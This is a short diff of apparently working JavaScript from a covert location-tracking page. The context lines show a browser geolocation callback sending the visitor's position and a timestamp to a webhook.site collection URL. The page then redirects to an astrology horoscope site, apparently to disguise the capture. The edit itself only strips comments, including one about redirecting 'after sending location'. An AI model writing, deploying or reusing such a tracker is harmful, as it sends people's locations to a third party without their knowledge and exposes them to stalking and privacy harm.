@@ -20,11 +20,9 @@ fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
     timestamp: new Date().toISOString()
         })
       });
-
-      // Optional redirect after sending location
       setTimeout(() => {
-        window.location.href = "https://www.astro.com/horoscope"; // Ganti URL jika perlu
-      }, 2000); // tunggu 2 detik
+        window.location.href = "https://www.astro.com/horoscope";
+      }, 2000);
     }, function(error) {
       console.error("Geolocation error:", error);
     });
